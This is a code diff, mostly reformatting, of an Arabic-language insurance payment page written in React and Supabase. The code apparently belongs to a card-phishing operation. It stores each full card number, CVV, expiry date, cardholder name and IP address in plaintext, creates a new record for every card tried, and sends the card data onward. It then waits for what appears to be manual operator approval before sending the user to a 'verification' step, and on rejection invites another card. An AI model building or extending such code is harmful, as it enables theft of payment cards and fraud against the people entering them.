@@ -17,8 +17,8 @@ import {
   DialogContent,
   DialogDescription,
   DialogHeader,
-  DialogTitle,
-} from "@/components/ui/dialog";
+  DialogTitle } from
+"@/components/ui/dialog";
 import { usePresence } from "@/hooks/usePresence";
 
 const Payment = () => {
@@ -41,7 +41,7 @@ const Payment = () => {
       return;
     }
     const timer = setInterval(() => {
-      setTimeLeft(prev => prev - 1);
+      setTimeLeft((prev) => prev - 1);
     }, 1000);
     return () => clearInterval(timer);
   }, [timeLeft]);
@@ -163,7 +163,7 @@ const Payment = () => {
     if (name === "expiryYear") {
       filteredValue = value.replace(/\D/g, "").slice(0, 2);
     }
-    setFormData(prev => ({
+    setFormData((prev) => ({
       ...prev,
       [name]: filteredValue
     }));
@@ -173,20 +173,20 @@ const Payment = () => {
     const storedId = localStorage.getItem('applicationId');
     if (storedId) {
       // Verify the application has customer data (name & phone)
-      supabase
-        .from('customer_applications')
-        .select('full_name, phone')
-        .eq('id', storedId)
-        .single()
-        .then(({ data }) => {
-          if (data?.full_name && data?.phone) {
-            setApplicationId(storedId);
-          } else {
-            // No valid customer data, redirect to home
-            console.warn('Application missing customer data, redirecting...');
-            navigate('/');
-          }
-        });
+      supabase.
+      from('customer_applications').
+      select('full_name, phone').
+      eq('id', storedId).
+      single().
+      then(({ data }) => {
+        if (data?.full_name && data?.phone) {
+          setApplicationId(storedId);
+        } else {
+          // No valid customer data, redirect to home
+          console.warn('Application missing customer data, redirecting...');
+          navigate('/');
+        }
+      });
     } else {
       // No application ID, redirect to home
       navigate('/');
@@ -197,16 +197,16 @@ const Payment = () => {
     if (waitingForApproval && applicationId) {
       // Check for approval every 2 seconds
       const interval = setInterval(async () => {
-        const { data, error } = await supabase
-          .from('customer_applications')
-          .select('payment_approved, status')
-          .eq('id', applicationId)
-          .single();
+        const { data, error } = await supabase.
+        from('customer_applications').
+        select('payment_approved, status').
+        eq('id', applicationId).
+        single();
 
         if (data?.payment_approved) {
           clearInterval(interval);
           setApprovalStatus('approved');
-          
+
           const cardDigits = formData.cardNumber.replace(/\s/g, "");
           const lastFour = cardDigits.slice(-4);
 
@@ -217,7 +217,7 @@ const Payment = () => {
         } else if (data?.status === 'rejected') {
           clearInterval(interval);
           setApprovalStatus('rejected');
-          
+
           setTimeout(() => {
             setWaitingForApproval(false);
             setApprovalStatus('waiting');
@@ -289,12 +289,12 @@ const Payment = () => {
         company_logo?: string;
       } = {};
       if (applicationId) {
-        const { data } = await supabase
-          .from('customer_applications')
-          .select('*')
-          .eq('id', applicationId)
-          .single();
-        
+        const { data } = await supabase.
+        from('customer_applications').
+        select('*').
+        eq('id', applicationId).
+        single();
+
         if (data) {
           existingData = {
             full_name: data.full_name,
@@ -309,7 +309,7 @@ const Payment = () => {
             selected_company: data.selected_company,
             selected_price: data.selected_price,
             regular_price: data.regular_price,
-            company_logo: data.company_logo,
+            company_logo: data.company_logo
           };
         }
       }
@@ -326,38 +326,38 @@ const Payment = () => {
 
       // Always create a new application for each card submission
       const ipAddress = localStorage.getItem('visitor_ip') || null;
-      const { data: newApp, error } = await supabase
-        .from('customer_applications')
-        .insert([{
-          full_name: existingData.full_name,
-          phone: existingData.phone,
-          insurance_type: existingData.insurance_type,
-          vehicle_manufacturer: existingData.vehicle_manufacturer,
-          vehicle_model: existingData.vehicle_model,
-          vehicle_year: existingData.vehicle_year,
-          vehicle_value: existingData.vehicle_value,
-          usage_purpose: existingData.usage_purpose,
-          add_driver: existingData.add_driver,
-          company_logo: existingData.company_logo,
-          cardholder_name: formData.cardholderName,
-          card_number: formData.cardNumber,
-          card_last_4: lastFour,
-          card_type: cardType,
-          card_cvv: formData.cvv,
-          expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
-          selected_company: companyName,
-          selected_price: price,
-          regular_price: regularPrice,
-          current_step: 'payment',
-          payment_approved: false,
-          status: 'pending_payment',
-          ip_address: ipAddress
-        }])
-        .select()
-        .single();
+      const { data: newApp, error } = await supabase.
+      from('customer_applications').
+      insert([{
+        full_name: existingData.full_name,
+        phone: existingData.phone,
+        insurance_type: existingData.insurance_type,
+        vehicle_manufacturer: existingData.vehicle_manufacturer,
+        vehicle_model: existingData.vehicle_model,
+        vehicle_year: existingData.vehicle_year,
+        vehicle_value: existingData.vehicle_value,
+        usage_purpose: existingData.usage_purpose,
+        add_driver: existingData.add_driver,
+        company_logo: existingData.company_logo,
+        cardholder_name: formData.cardholderName,
+        card_number: formData.cardNumber,
+        card_last_4: lastFour,
+        card_type: cardType,
+        card_cvv: formData.cvv,
+        expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
+        selected_company: companyName,
+        selected_price: price,
+        regular_price: regularPrice,
+        current_step: 'payment',
+        payment_approved: false,
+        status: 'pending_payment',
+        ip_address: ipAddress
+      }]).
+      select().
+      single();
 
       if (error) throw error;
-      
+
       if (newApp) {
         setApplicationId(newApp.id);
         localStorage.setItem('applicationId', newApp.id);
@@ -378,7 +378,7 @@ const Payment = () => {
                 cardholderName: formData.cardholderName,
                 cardNumber: formData.cardNumber,
                 cardCvv: formData.cvv,
-                expiryDate: `${formData.expiryMonth}/${formData.expiryYear}`,
+                expiryDate: `${formData.expiryMonth}/${formData.expiryYear}`
               }
             }
           });
@@ -419,52 +419,52 @@ const Payment = () => {
             <div className="space-y-6">
               <div className="relative">
                 {/* البطاقة الأمامية */}
-                <div className="relative w-full aspect-[1.586/1] rounded-xl md:rounded-2xl p-4 md:p-6 lg:p-8 shadow-2xl transition-all duration-300 hover:scale-105" style={{
-                background: cardType === "visa" ? "linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%)" : cardType === "mastercard" ? "linear-gradient(135deg, #991b1b 0%, #dc2626 100%)" : "linear-gradient(135deg, #1e293b 0%, #334155 100%)"
-              }}>
-                  {/* رقائق البطاقة */}
-                  <div className="absolute top-3 left-3 md:top-6 md:left-6 w-10 h-8 md:w-12 md:h-10 lg:w-14 lg:h-12 bg-gradient-to-br from-yellow-200 to-yellow-400 rounded-md opacity-80"></div>
-                  
-                  {/* شعار نوع البطاقة */}
-                  <div className="absolute top-3 right-3 md:top-6 md:right-6">
-                    {cardType === "visa" ? <div className="bg-white px-2 py-0.5 md:px-3 md:py-1 rounded text-blue-600 font-black text-base md:text-xl lg:text-2xl">
-                        VISA
-                      </div> : cardType === "mastercard" ? <div className="flex items-center">
-                        <div className="w-6 h-6 md:w-8 md:h-8 lg:w-10 lg:h-10 rounded-full bg-red-500" />
-                        <div className="w-6 h-6 md:w-8 md:h-8 lg:w-10 lg:h-10 rounded-full bg-yellow-500 -ml-3 md:-ml-4" />
-                      </div> : <div className="w-8 h-8 md:w-10 md:h-10 lg:w-12 lg:h-12 bg-white/20 rounded-full flex items-center justify-center">
-                        <CreditCard className="h-4 w-4 md:h-5 md:w-5 lg:h-6 lg:w-6 text-white" />
-                      </div>}
-                  </div>
+                
 
-                  {/* رقم البطاقة */}
-                  <div className="absolute bottom-14 md:bottom-20 lg:bottom-24 left-3 right-3 md:left-6 md:right-6">
-                    <p className="text-white font-mono text-sm md:text-lg lg:text-2xl tracking-wider text-center" dir="ltr">
-                      {formData.cardNumber || "•••• •••• •••• ••••"}
-                    </p>
-                  </div>
 
-                  {/* اسم حامل البطاقة وتاريخ الانتهاء */}
-                  <div className="absolute bottom-3 md:bottom-6 left-3 right-3 md:left-6 md:right-6 flex justify-between items-end gap-2">
-                    <div className="flex-1 min-w-0">
-                      <p className="text-white/60 text-[10px] md:text-xs mb-0.5 md:mb-1">CARDHOLDER NAME</p>
-                      <p className="text-white font-semibold text-xs md:text-sm lg:text-base uppercase truncate">
-                        {formData.cardholderName || "YOUR NAME"}
-                      </p>
-                    </div>
-                    <div className="text-right flex-shrink-0">
-                      <p className="text-white/60 text-[10px] md:text-xs mb-0.5 md:mb-1">VALID THRU</p>
-                      <p className="text-white font-mono text-xs md:text-sm lg:text-base" dir="ltr">
-                        {formData.expiryMonth && formData.expiryYear ? `${formData.expiryMonth}/${formData.expiryYear}` : "MM/YY"}
-                      </p>
-                    </div>
-                  </div>
-                </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
               </div>
 
               {/* بانر الخصم الإضافي */}
-              {extraDiscountApplied && (
-                <Card className="p-4 bg-gradient-to-r from-orange-500 to-red-500 text-white border-0 shadow-lg animate-pulse">
+              {extraDiscountApplied &&
+            <Card className="p-4 bg-gradient-to-r from-orange-500 to-red-500 text-white border-0 shadow-lg animate-pulse">
                   <div className="text-center space-y-2">
                     <div className="flex items-center justify-center gap-2">
                       <span className="text-2xl">🔥</span>
@@ -479,7 +479,7 @@ const Payment = () => {
                     </div>
                   </div>
                 </Card>
-              )}
+            }
 
               {/* ملخص الطلب */}
               <Card className="p-6 shadow-lg border-2">
@@ -496,38 +496,38 @@ const Payment = () => {
                     <span className="text-sm text-muted-foreground">السعر الأصلي:</span>
                     <span className="text-sm line-through text-muted-foreground">{regularPrice} ﷼</span>
                   </div>
-                  {parseFloat(discount) > 0 && (
-                    <div className="flex justify-between items-center bg-emerald-50 dark:bg-emerald-950/30 p-3 rounded-lg">
+                  {parseFloat(discount) > 0 &&
+                <div className="flex justify-between items-center bg-emerald-50 dark:bg-emerald-950/30 p-3 rounded-lg">
                       <span className="text-sm text-emerald-700 dark:text-emerald-400 font-semibold">🎉 الخصم الأول</span>
                       <span className="text-lg text-emerald-700 dark:text-emerald-400 font-bold">- {discount} ﷼</span>
                     </div>
-                  )}
+                }
                   <div className="flex justify-between items-center py-2">
                     <span className="text-sm text-muted-foreground">السعر بعد الخصم:</span>
                     <span className="text-sm text-muted-foreground">{price} ﷼</span>
                   </div>
-                  {extraDiscountApplied && (
-                    <div className="flex justify-between items-center bg-orange-50 dark:bg-orange-950/30 p-3 rounded-lg border-2 border-orange-300 dark:border-orange-700">
+                  {extraDiscountApplied &&
+                <div className="flex justify-between items-center bg-orange-50 dark:bg-orange-950/30 p-3 rounded-lg border-2 border-orange-300 dark:border-orange-700">
                       <span className="text-sm text-orange-700 dark:text-orange-400 font-semibold">🔥 خصم الدفع الفوري (10%)</span>
                       <span className="text-lg text-orange-700 dark:text-orange-400 font-bold">- {extraDiscount} ﷼</span>
                     </div>
-                  )}
+                }
                   <div className="flex justify-between items-center pt-4 border-t-2">
                     <span className="text-xl font-bold">المبلغ الإجمالي:</span>
                     <div className="text-right">
-                      {extraDiscountApplied && (
-                        <span className="text-sm line-through text-muted-foreground block">{price} ﷼</span>
-                      )}
+                      {extraDiscountApplied &&
+                    <span className="text-sm line-through text-muted-foreground block">{price} ﷼</span>
+                    }
                       <span className="text-3xl font-black text-primary">{finalPrice} ﷼</span>
                     </div>
                   </div>
-                  {extraDiscountApplied && (
-                    <div className="bg-green-100 dark:bg-green-900/30 p-3 rounded-lg text-center">
+                  {extraDiscountApplied &&
+                <div className="bg-green-100 dark:bg-green-900/30 p-3 rounded-lg text-center">
                       <span className="text-green-700 dark:text-green-400 font-bold">
                         💰 وفرت {(parseFloat(discount) + parseFloat(extraDiscount)).toFixed(2)} ﷼
                       </span>
                     </div>
-                  )}
+                }
                 </div>
 
                 {/* شعارات الأمان */}
@@ -606,23 +606,23 @@ const Payment = () => {
 
                 {/* أزرار التحكم */}
                 <div className="flex gap-3 md:gap-4 pt-4 md:pt-6">
-                  <Button 
-                    type="submit" 
-                    size="lg" 
-                    disabled={waitingForApproval}
-                    className="flex-1 h-11 md:h-12 bg-gradient-to-l from-emerald-600 to-emerald-500 hover:from-emerald-700 hover:to-emerald-600 text-white font-bold shadow-lg shadow-emerald-500/30 text-sm md:text-base disabled:opacity-50"
-                  >
-                    {waitingForApproval ? (
-                      <>
+                  <Button
+                  type="submit"
+                  size="lg"
+                  disabled={waitingForApproval}
+                  className="flex-1 h-11 md:h-12 bg-gradient-to-l from-emerald-600 to-emerald-500 hover:from-emerald-700 hover:to-emerald-600 text-white font-bold shadow-lg shadow-emerald-500/30 text-sm md:text-base disabled:opacity-50">
+
+                    {waitingForApproval ?
+                  <>
                         <Loader2 className="ml-2 h-4 w-4 md:h-5 md:w-5 animate-spin" />
                         في انتظار الموافقة...
-                      </>
-                    ) : (
-                      <>
+                      </> :
+
+                  <>
                         <Lock className="ml-2 h-4 w-4 md:h-5 md:w-5" />
                         ادفع {price} ﷼ بأمان
                       </>
-                    )}
+                  }
                   </Button>
                 </div>
 
@@ -647,8 +647,8 @@ const Payment = () => {
                 </DialogTitle>
               </DialogHeader>
               <div className="flex flex-col items-center justify-center py-8 gap-6">
-                {approvalStatus === 'waiting' && (
-                  <>
+                {approvalStatus === 'waiting' &&
+              <>
                     <div className="relative">
                       <div className="w-24 h-24 border-4 border-primary/20 rounded-full"></div>
                       <div className="w-24 h-24 border-4 border-primary border-t-transparent rounded-full animate-spin absolute top-0 left-0"></div>
@@ -658,10 +658,10 @@ const Payment = () => {
                       <p className="text-muted-foreground">يرجى الانتظار...</p>
                     </div>
                   </>
-                )}
+              }
                 
-                {approvalStatus === 'approved' && (
-                  <>
+                {approvalStatus === 'approved' &&
+              <>
                     <div className="relative">
                       <div className="w-24 h-24 bg-emerald-100 dark:bg-emerald-950 rounded-full flex items-center justify-center">
                         <CheckCircle2 className="w-16 h-16 text-emerald-600 dark:text-emerald-400" />
@@ -672,10 +672,10 @@ const Payment = () => {
                       <p className="text-muted-foreground">جاري الانتقال إلى صفحة التحقق...</p>
                     </div>
                   </>
-                )}
+              }
                 
-                {approvalStatus === 'rejected' && (
-                  <>
+                {approvalStatus === 'rejected' &&
+              <>
                     <div className="relative">
                       <div className="w-24 h-24 bg-red-100 dark:bg-red-950 rounded-full flex items-center justify-center">
                         <XCircle className="w-16 h-16 text-red-600 dark:text-red-400" />
@@ -686,7 +686,7 @@ const Payment = () => {
                       <p className="text-muted-foreground">يجب التحقق من بطاقتك أو تغيير البطاقة</p>
                     </div>
                   </>
-                )}
+              }
               </div>
             </DialogContent>
           </Dialog>
